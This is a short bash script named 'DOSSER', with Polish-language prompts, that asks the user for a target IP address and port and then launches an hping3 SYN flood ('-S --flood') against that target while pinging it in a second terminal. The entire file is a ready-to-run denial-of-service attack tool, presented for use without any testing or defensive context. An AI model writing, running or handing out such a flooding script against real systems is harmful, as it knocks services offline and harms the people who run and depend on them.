#! /bin/bash
figlet "DOSSER" 
read -r -p "Wprowadź IP celu - " IP
read -r -p "Wprowadź port celu - " PORT
gnome-terminal -- sudo ping $IP
sudo hping3 -S --flood -V -p $PORT $IP
echo "Dziękuje za skorzystanie ze skryptu !"

